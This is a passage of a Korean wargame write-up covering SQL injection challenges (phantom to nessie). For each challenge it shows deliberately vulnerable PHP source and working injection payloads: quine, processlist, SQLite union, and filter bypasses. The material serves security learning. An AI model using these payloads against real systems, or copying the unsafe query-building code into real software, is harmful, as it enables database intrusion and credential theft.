class="string">'email'</span>] === $_GET[<span class="string">'email'</span>]))&#123; mysqli_query($db,<span class="string">"delete from prob_phantom where no != 1"</span>); mysqli_query($db,<span class="string">"alter table prob_phantom AUTO_INCREMENT=2"</span>); solve(<span class="string">"phantom"</span>); &#125;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>insert 문에서는 대상 테이블과 동일한 테이블에서 데이터를 참조하는 것이 금지되어 있는데 as 문을 이용해 테이블에 별칭을 정의해주면 우회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : joinmail&#x3D;&#39;),(0,&quot;&lt;my ip&gt;&quot;,(select email from prob_phantom as a limit 1))#</span><br></pre></td></tr></table></figure><h3 id="30-ouroboros"><a href="#30-ouroboros" class="headerlink" title="30. ouroboros"></a>30. ouroboros</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|rollup|join|@/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select pw from prob_ouroboros where pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Pw : &#123;$result[pw]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"ouroboros"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Quine SQL Injection</p><p><a href="https://p.osix.kr/quine-sql-injection/" target="_blank" rel="noopener">https://p.osix.kr/quine-sql-injection/</a></p></blockquote><p>이전에 작성한 게시글로 설명을 대체하겠습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39; union select replace(replace(&#39;&quot; union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;) #&#39;,char(34),char(39)),char(36),&#39;&quot; union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;) #&#39;) #</span><br></pre></td></tr></table></figure><h3 id="31-zombie"><a href="#31-zombie" class="headerlink" title="31. zombie"></a>31. zombie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect(<span class="string">"zombie"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/rollup|join|ace|@/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select pw from prob_zombie where pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Pw : &#123;$result[pw]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"zombie"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 에서 실행중인 쿼리는 information_schema의 processlist 에 기록됩니다.<br>이를 활용하여 다른 사용자들이 실행시킨 쿼리 문을 알아내는 mitm sql injection이라는 기법도 존재하는데, 그 주제로 정도원님이 발표하신 자료가 있어 링크로 걸어 두겠습니다.</p><blockquote><p>웹해킹이라고 무시하는 것들 보소</p><p><a href="http://secuinside.com/archive/2017/2017-1-2.pdf" target="_blank" rel="noopener">http://secuinside.com/archive/2017/2017-1-2.pdf</a></p></blockquote><p>processlist 에서 실행중인 쿼리를 가져와 적절히 substring 범위를 지정해 주면 해결됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;union select mid(info,38,66) from information_schema.processlist#</span><br></pre></td></tr></table></figure><h3 id="32-alien"><a href="#32-alien" class="headerlink" title="32. alien"></a>32. alien</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/admin|and|or|if|coalesce|case|_|\.|prob|time/i'</span>, $_GET[<span class="string">'no'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_alien where no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $query2 = <span class="string">"select id from prob_alien where no='&#123;$_GET[no]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query2 : &lt;strong&gt;&#123;$query2&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">'no'</span>])&#123;</span><br><span class="line">    $r = mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">'id'</span>] !== <span class="string">"admin"</span>) <span class="keyword">exit</span>(<span class="string">"sandbox1"</span>);</span><br><span class="line">    $r = mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">'id'</span>] === <span class="string">"admin"</span>) <span class="keyword">exit</span>(<span class="string">"sandbox2"</span>);</span><br><span class="line">    $r = mysqli_fetch_array(mysqli_query($db,$query2));</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">'id'</span>] === <span class="string">"admin"</span>) <span class="keyword">exit</span>(<span class="string">"sandbox"</span>);</span><br><span class="line">    $r = mysqli_fetch_array(mysqli_query($db,$query2));</span><br><span class="line">    <span class="keyword">if</span>($r[<span class="string">'id'</span>] === <span class="string">"admin"</span>) solve(<span class="string">"alien"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4개의 비교식을 통과하는 것이 목표인데<br>동일한 쿼리에서 다른 값을 반환해야 하는 것이 첫번째 조건이고<br>싱글쿼트 처리가 된 쿼리에서도 동일하게 작동하는 것이 두번째 조건입니다.</p><p>#을 넣었을때 싱글쿼트 안에서는 문자열로 취급되고<br>밖에서는 일반 구문으로 해석된다는 점을 이용하면<br>문제를 해결할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : no&#x3D;0#&#39; union select concat(char(now()%2+96),&quot;dmin&quot;) id%0aunion select concat(char(now()%2-sleep(1)+97),&quot;dmin&quot;) id limit 1#</span><br></pre></td></tr></table></figure><h3 id="33-cthulhu"><a href="#33-cthulhu" class="headerlink" title="33. cthulhu"></a>33. cthulhu</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./welcome.php"</span>;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|admin/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|admin/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_cthulhu where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"cthulhu"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>최소한의 mod security 설정이 적용된 문제입니다.<br>괄호나 특수문자, SQL 구문 등을 기반으로 필터링되는데<br>이것저것 시도하다보면 어렵지 않게 답을 찾을 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;\&amp;pw&#x3D;||1#</span><br></pre></td></tr></table></figure><h3 id="34-death"><a href="#34-death" class="headerlink" title="34. death"></a>34. death</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|admin/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|admin/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_death where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"death"</span>);</span><br><span class="line">  <span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일하지만 guest 계정이 존재하므로 조건식, limit, order by 등을 사용해주면 되겠습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : id&#x3D;\&amp;pw&#x3D;||1 limit 1,1#</span><br><span class="line">Solution2 : id&#x3D;\&amp;pw&#x3D;||id&#x3D;0x61646d696e#</span><br></pre></td></tr></table></figure><h3 id="35-godzilla"><a href="#35-godzilla" class="headerlink" title="35. godzilla"></a>35. godzilla</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_godzilla where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>;</span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_godzilla where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"godzilla"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>‘%’는 필터링되지만 rlike 를 사용하거나 hex 인코딩을 통해 우회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : id&#x3D;\&amp;pw&#x3D;||pw rlike &#39;^a&#39;#</span><br><span class="line">Solution2 : id&#x3D;\&amp;pw&#x3D;||pw like 0x25#</span><br></pre></td></tr></table></figure><h3 id="36-cyclops"><a href="#36-cyclops" class="headerlink" title="36. cyclops"></a>36. cyclops</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id,pw from prob_cyclops where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'id'</span>] === <span class="string">"first"</span>) &amp;&amp; ($result[<span class="string">'pw'</span>] === <span class="string">"second"</span>)) solve(<span class="string">"cyclops"</span>);<span class="comment">//must use union select</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>테이블에 데이터가 없으므로 union 구문을 이용해야 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;\&amp;pw&#x3D;union&#x2F;**&#x2F;select&#x2F;**&#x2F;0x6669727374 x,0x7365636f6e64#</span><br></pre></td></tr></table></figure><h3 id="37-chupacabra"><a href="#37-chupacabra" class="headerlink" title="37. chupacabra"></a>37. chupacabra</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = sqlite_open(<span class="string">"./db/chupacabra.db"</span>);</span><br><span class="line">  $query = <span class="string">"select id from member where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlite_fetch_array(sqlite_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) solve(<span class="string">"chupacabra"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite 인젝션 문제입니다. 쿼리 문법에 있어서는 mysql 과 유사한 점이 많지만 sqlite에서는 #을 주석용법으로 사용하지 않는다는 점만은 기억해둡시다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;1&amp;pw&#x3D;&#39;union select&quot;admin&quot;--</span><br></pre></td></tr></table></figure><h3 id="38-manticore"><a href="#38-manticore" class="headerlink" title="38. manticore"></a>38. manticore</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = sqlite_open(<span class="string">"./db/manticore.db"</span>);</span><br><span class="line">  $_GET[<span class="string">'id'</span>] = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">  $_GET[<span class="string">'pw'</span>] = addslashes($_GET[<span class="string">'pw'</span>]);</span><br><span class="line">  $query = <span class="string">"select id from member where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlite_fetch_array(sqlite_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">"admin"</span>) solve(<span class="string">"manticore"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>실제 데이터가 없으므로 union 구문을 이용해야 합니다.<br>addslashes 함수의 영향으로 싱글쿼트 앞에 백슬래시가 붙지만 sqlite 에서는 mysql 과 다르게 쿼트 앞에 백슬래시가 붙어도 구문으로서 해석합니다.<br>char 함수를 통해 문자를 만들고 ||으로 결합해서 사용하면 되겠습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&amp;pw&#x3D;&#39; and 0 union select (char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))--</span><br></pre></td></tr></table></figure><h3 id="39-banshee"><a href="#39-banshee" class="headerlink" title="39. banshee"></a>39. banshee</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = sqlite_open(<span class="string">"./db/banshee.db"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/sqlite|member|_/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from member where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlite_fetch_array(sqlite_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;login success!&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select pw from member where id='admin'"</span>; </span><br><span class="line">  $result = sqlite_fetch_array(sqlite_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"banshee"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite에서는 mysql과 다르게 &amp;&amp;, ||을 사용할 수 없다는 점만 알고 넘어갑시다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39; or id&#x3D;&quot;admin&quot; and pw like &#39;&lt;BRUTE_HERE&gt;%&#39;--</span><br></pre></td></tr></table></figure><h3 id="40-poltergeist"><a href="#40-poltergeist" class="headerlink" title="40. poltergeist"></a>40. poltergeist</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = sqlite_open(<span class="string">"./db/poltergeist.db"</span>);</span><br><span class="line">  $query = <span class="string">"select id from member where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlite_fetch_array(sqlite_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($poltergeistFlag === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"poltergeist"</span>);<span class="comment">// Flag is in `flag_&#123;$hash&#125;` table, not in `member` table. Let's look over whole of the database.</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqlite에서는 select tbl_name from sqlite_master 쿼리를 통해 모든 테이블명을 조회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Solution</span><br><span class="line">1. pw&#x3D;&#39; union select group_concat(tbl_name) from sqlite_master--</span><br><span class="line">2. pw&#x3D;&#39; union select * from flag_1q2w3e4r--</span><br></pre></td></tr></table></figure><h3 id="41-nessie"><a href="#41-nessie" class="headerlink" title="41. nessie"></a>41. nessie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mssql_connect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|prob|;|watifor/i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|prob|;|waitfor/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_nessie where id='&#123;$_GET['id']&#125;' and pw='&#123;$_GET['pw']&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  sqlsrv_query($db,$query);</span><br><span class="line">  <span class="keyword">if</span>(sqlsrv_errors()) <span class="keyword">exit</span>(mssql_error(sqlsrv_errors()));</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select pw from prob_nessie where id='admin'"</span>; </span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span 